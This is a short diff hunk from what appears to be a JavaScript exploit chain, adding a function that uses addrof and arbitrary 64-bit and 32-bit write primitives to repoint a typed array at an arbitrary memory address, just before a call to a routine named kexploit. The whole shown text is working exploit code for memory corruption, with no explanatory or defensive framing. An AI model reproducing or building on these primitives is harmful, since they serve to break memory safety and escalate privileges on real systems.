@@ -1801,7 +1801,15 @@ function malloc32(sz) {
     ptr.backing = new Uint32Array(backing.buffer);
     return ptr;
 }
-
+function array_from_address(addr, size) {
+var og_array = new Uint32Array(0x1000);
+var og_array_i = mem.addrof(og_array).add(0x10);
+mem.write64(og_array_i, addr);
+mem.write32(og_array_i.add(0x8), size);
+mem.write32(og_array_i.add(0xC), 0x1);
+nogc.push(og_array);
+return og_array;
+}
 
 kexploit().then(() => {
 
